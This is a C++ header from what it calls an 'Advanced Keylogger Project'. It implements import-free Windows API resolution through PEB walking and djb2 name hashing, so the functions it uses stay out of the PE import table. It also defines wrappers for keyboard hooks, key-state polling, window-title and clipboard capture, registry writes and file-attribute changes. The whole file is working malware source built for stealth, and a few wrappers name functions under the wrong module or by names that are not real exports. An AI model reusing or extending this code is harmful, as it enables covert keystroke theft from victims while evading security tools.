/*
 * Runtime API Resolution Header
 * Import-free API calling via PEB walking and hash matching
 * 
 * Features:
 * - No visible imports in PE import table
 * - djb2 hash for function names
 * - Compile-time hash computation (constexpr)
 * - Lazy loading with caching
 * - Supports kernel32, user32, advapi32, ntdll
 * 
 * Advanced Keylogger Project - Elite Upgrade
 */

#ifndef API_RESOLVE_H
#define API_RESOLVE_H

#include <windows.h>
#include <winternl.h>

// ==================== HASH ALGORITHM ====================

// Compile-time djb2 hash
constexpr DWORD CTHash(const char* str, DWORD hash = 5381) {
    return (*str == 0) ? hash : CTHash(str + 1, ((hash << 5) + hash) + *str);
}

// Runtime djb2 hash
inline DWORD RTHash(const char* str) {
    DWORD hash = 5381;
    while (*str) {
        hash = ((hash << 5) + hash) + *str++;
    }
    return hash;
}

// Macro for compile-time API hash
#define API(name) CTHash(#name)

// ==================== MODULE HASHES ====================

#define MOD_KERNEL32    CTHash("kernel32.dll")
#define MOD_NTDLL       CTHash("ntdll.dll")
#define MOD_USER32      CTHash("user32.dll")
#define MOD_ADVAPI32    CTHash("advapi32.dll")
#define MOD_WININET     CTHash("wininet.dll")
#define MOD_WS2_32      CTHash("ws2_32.dll")
#define MOD_GDI32       CTHash("gdi32.dll")
#define MOD_SHELL32     CTHash("shell32.dll")
#define MOD_OLE32       CTHash("ole32.dll")
#define MOD_OLEAUT32    CTHash("oleaut32.dll")
#define MOD_CRYPT32     CTHash("crypt32.dll")
#define MOD_GDIPLUS     CTHash("gdiplus.dll")

// ==================== API CACHE ====================

#define API_CACHE_SIZE 128

typedef struct _API_CACHE_ENTRY {
    DWORD dwModuleHash;
    DWORD dwFunctionHash;
    PVOID pFunction;
} API_CACHE_ENTRY, *PAPI_CACHE_ENTRY;

static API_CACHE_ENTRY g_ApiCache[API_CACHE_SIZE] = { 0 };
static DWORD g_ApiCacheCount = 0;

// ==================== PEB WALKING ====================

inline PPEB GetPEBInternal() {
#ifdef _WIN64
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

// Find module by hash
inline PVOID GetModuleByHashR(DWORD dwHash) {
    PPEB pPeb = GetPEBInternal();
    if (!pPeb || !pPeb->Ldr) return NULL;
    
    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;
    
    while (pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(
            pEntry,
            LDR_DATA_TABLE_ENTRY,
            InMemoryOrderLinks
        );
        
        if (pLdrEntry->FullDllName.Buffer) {
            // Extract filename from full path
            WCHAR* pName = pLdrEntry->FullDllName.Buffer;
            WCHAR* pFileName = pName;
            
            while (*pName) {
                if (*pName == L'\\' || *pName == L'/') {
                    pFileName = pName + 1;
                }
                pName++;
            }
            
            // Convert to lowercase ASCII and hash
            char szModuleName[256] = { 0 };
            int i = 0;
            while (*pFileName && i < 255) {
                szModuleName[i++] = (*pFileName >= L'A' && *pFileName <= L'Z')
                    ? (char)(*pFileName + 32)
                    : (char)*pFileName;
                pFileName++;
            }
            
            if (RTHash(szModuleName) == dwHash) {
                return pLdrEntry->DllBase;
            }
        }
        
        pEntry = pEntry->Flink;
    }
    
    return NULL;
}

// Get export by hash from module
inline PVOID GetExportByHashR(PVOID pModuleBase, DWORD dwHash) {
    if (!pModuleBase) return NULL;
    
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pModuleBase;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)pModuleBase + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    DWORD dwExportRVA = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD dwExportSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    
    if (!dwExportRVA) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)pModuleBase + dwExportRVA);
    
    PDWORD pNames = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfNames);
    PDWORD pFuncs = (PDWORD)((BYTE*)pModuleBase + pExport->AddressOfFunctions);
    PWORD pOrds = (PWORD)((BYTE*)pModuleBase + pExport->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
        const char* szName = (const char*)((BYTE*)pModuleBase + pNames[i]);
        
        if (RTHash(szName) == dwHash) {
            DWORD dwFuncRVA = pFuncs[pOrds[i]];
            PVOID pFunc = (PVOID)((BYTE*)pModuleBase + dwFuncRVA);
            
            // Check for forwarded export
            if (dwFuncRVA >= dwExportRVA && dwFuncRVA < dwExportRVA + dwExportSize) {
                // This is a forwarded export - parse and resolve
                // Format: "MODULE.FunctionName"
                char szForward[256];
                strncpy_s(szForward, (const char*)pFunc, 255);
                
                char* pDot = strchr(szForward, '.');
                if (pDot) {
                    *pDot = 0;
                    char szModName[128];
                    sprintf_s(szModName, "%s.dll", szForward);
                    
                    // Recursive resolution
                    PVOID pFwdModule = GetModuleByHashR(RTHash(szModName));
                    if (pFwdModule) {
                        return GetExportByHashR(pFwdModule, RTHash(pDot + 1));
                    }
                }
                return NULL;
            }
            
            return pFunc;
        }
    }
    
    return NULL;
}

// ==================== CACHED RESOLUTION ====================

inline PVOID GetApiCached(DWORD dwModuleHash, DWORD dwFunctionHash) {
    // Check cache first
    for (DWORD i = 0; i < g_ApiCacheCount; i++) {
        if (g_ApiCache[i].dwModuleHash == dwModuleHash &&
            g_ApiCache[i].dwFunctionHash == dwFunctionHash) {
            return g_ApiCache[i].pFunction;
        }
    }
    
    // Resolve
    PVOID pModule = GetModuleByHashR(dwModuleHash);
    if (!pModule) return NULL;
    
    PVOID pFunc = GetExportByHashR(pModule, dwFunctionHash);
    if (!pFunc) return NULL;
    
    // Cache the result
    if (g_ApiCacheCount < API_CACHE_SIZE) {
        g_ApiCache[g_ApiCacheCount].dwModuleHash = dwModuleHash;
        g_ApiCache[g_ApiCacheCount].dwFunctionHash = dwFunctionHash;
        g_ApiCache[g_ApiCacheCount].pFunction = pFunc;
        g_ApiCacheCount++;
    }
    
    return pFunc;
}

// Helper macro for cleaner calls
#define GET_API(module, func) GetApiCached(module, CTHash(#func))

// ==================== LAZY LOAD MODULES ====================

// Load module by hash (LoadLibrary equivalent)
inline HMODULE LoadModuleByHash(DWORD dwHash) {
    // First check if already loaded
    PVOID pModule = GetModuleByHashR(dwHash);
    if (pModule) return (HMODULE)pModule;
    
    // Need to load it - get LoadLibraryA
    typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR);
    pLoadLibraryA fnLoadLibrary = (pLoadLibraryA)GetApiCached(MOD_KERNEL32, CTHash("LoadLibraryA"));
    
    if (!fnLoadLibrary) return NULL;
    
    // Map hash to name (limited set)
    const char* moduleName = NULL;
    
    if (dwHash == MOD_USER32) moduleName = "user32.dll";
    else if (dwHash == MOD_ADVAPI32) moduleName = "advapi32.dll";
    else if (dwHash == MOD_WININET) moduleName = "wininet.dll";
    else if (dwHash == MOD_WS2_32) moduleName = "ws2_32.dll";
    else if (dwHash == MOD_GDI32) moduleName = "gdi32.dll";
    else if (dwHash == MOD_SHELL32) moduleName = "shell32.dll";
    else if (dwHash == MOD_OLE32) moduleName = "ole32.dll";
    else if (dwHash == MOD_OLEAUT32) moduleName = "oleaut32.dll";
    else if (dwHash == MOD_CRYPT32) moduleName = "crypt32.dll";
    else if (dwHash == MOD_GDIPLUS) moduleName = "gdiplus.dll";
    
    if (!moduleName) return NULL;
    
    return fnLoadLibrary(moduleName);
}

// ==================== TYPE-SAFE API WRAPPERS ====================

// Macro to define API wrapper
#define DEFINE_API_WRAPPER(module, rettype, callconv, name, ...)        \
    typedef rettype (callconv *pFn##name)(__VA_ARGS__);                 \
    inline pFn##name Get##name() {                                      \
        static pFn##name fn = NULL;                                     \
        if (!fn) {                                                      \
            fn = (pFn##name)GetApiCached(module, CTHash(#name));        \
        }                                                               \
        return fn;                                                      \
    }

// ==================== COMMON API WRAPPERS ====================

// Kernel32
DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, VirtualProtect, 
    LPVOID, SIZE_T, DWORD, PDWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, LPVOID, WINAPI, VirtualAlloc,
    LPVOID, SIZE_T, DWORD, DWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, VirtualFree,
    LPVOID, SIZE_T, DWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, HANDLE, WINAPI, CreateFileA,
    LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, ReadFile,
    HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, WriteFile,
    HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, CloseHandle,
    HANDLE)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetFileSize,
    HANDLE, LPDWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, HANDLE, WINAPI, CreateThread,
    LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, void, WINAPI, Sleep,
    DWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, CreateProcessA,
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, 
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetLastError)

DEFINE_API_WRAPPER(MOD_KERNEL32, HMODULE, WINAPI, GetModuleHandleA,
    LPCSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, FARPROC, WINAPI, GetProcAddress,
    HMODULE, LPCSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, HMODULE, WINAPI, LoadLibraryA,
    LPCSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, FreeLibrary,
    HMODULE)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetCurrentProcessId)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetCurrentThreadId)

DEFINE_API_WRAPPER(MOD_KERNEL32, HANDLE, WINAPI, GetCurrentProcess)

DEFINE_API_WRAPPER(MOD_KERNEL32, HANDLE, WINAPI, GetCurrentThread)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetModuleFileNameA,
    HMODULE, LPSTR, DWORD)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetTempPathA,
    DWORD, LPSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetTickCount)

DEFINE_API_WRAPPER(MOD_KERNEL32, ULONGLONG, WINAPI, GetTickCount64)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, CopyFileA,
    LPCSTR, LPCSTR, BOOL)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, DeleteFileA,
    LPCSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, CreateDirectoryA,
    LPCSTR, LPSECURITY_ATTRIBUTES)

DEFINE_API_WRAPPER(MOD_KERNEL32, DWORD, WINAPI, GetFileAttributesA,
    LPCSTR)

DEFINE_API_WRAPPER(MOD_KERNEL32, BOOL, WINAPI, SetFileAttributesA,
    LPCSTR, DWORD)

// User32
DEFINE_API_WRAPPER(MOD_USER32, HHOOK, WINAPI, SetWindowsHookExA,
    int, HOOKPROC, HINSTANCE, DWORD)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, UnhookWindowsHookEx,
    HHOOK)

DEFINE_API_WRAPPER(MOD_USER32, LRESULT, WINAPI, CallNextHookEx,
    HHOOK, int, WPARAM, LPARAM)

DEFINE_API_WRAPPER(MOD_USER32, HWND, WINAPI, GetForegroundWindow)

DEFINE_API_WRAPPER(MOD_USER32, int, WINAPI, GetWindowTextA,
    HWND, LPSTR, int)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, GetMessage,
    LPMSG, HWND, UINT, UINT)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, TranslateMessage,
    const MSG*)

DEFINE_API_WRAPPER(MOD_USER32, LRESULT, WINAPI, DispatchMessage,
    const MSG*)

DEFINE_API_WRAPPER(MOD_USER32, SHORT, WINAPI, GetAsyncKeyState,
    int)

DEFINE_API_WRAPPER(MOD_USER32, SHORT, WINAPI, GetKeyState,
    int)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, OpenClipboard,
    HWND)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, CloseClipboard)

DEFINE_API_WRAPPER(MOD_USER32, HANDLE, WINAPI, GetClipboardData,
    UINT)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, GetCursorPos,
    LPPOINT)

DEFINE_API_WRAPPER(MOD_USER32, HWND, WINAPI, GetConsoleWindow)

DEFINE_API_WRAPPER(MOD_USER32, BOOL, WINAPI, ShowWindow,
    HWND, int)

// Advapi32
DEFINE_API_WRAPPER(MOD_ADVAPI32, LSTATUS, WINAPI, RegOpenKeyExA,
    HKEY, LPCSTR, DWORD, REGSAM, PHKEY)

DEFINE_API_WRAPPER(MOD_ADVAPI32, LSTATUS, WINAPI, RegSetValueExA,
    HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD)

DEFINE_API_WRAPPER(MOD_ADVAPI32, LSTATUS, WINAPI, RegCloseKey,
    HKEY)

DEFINE_API_WRAPPER(MOD_ADVAPI32, LSTATUS, WINAPI, RegDeleteKeyA,
    HKEY, LPCSTR)

DEFINE_API_WRAPPER(MOD_ADVAPI32, BOOL, WINAPI, GetUserNameA,
    LPSTR, LPDWORD)

// ==================== INITIALIZATION ====================

inline BOOL InitializeApiResolve() {
    // Pre-cache critical APIs
    GetVirtualAlloc();
    GetVirtualProtect();
    GetVirtualFree();
    GetCreateThread();
    GetSleep();
    GetCloseHandle();
    GetGetModuleHandleA();
    GetLoadLibraryA();
    
    return TRUE;
}

#endif // API_RESOLVE_H
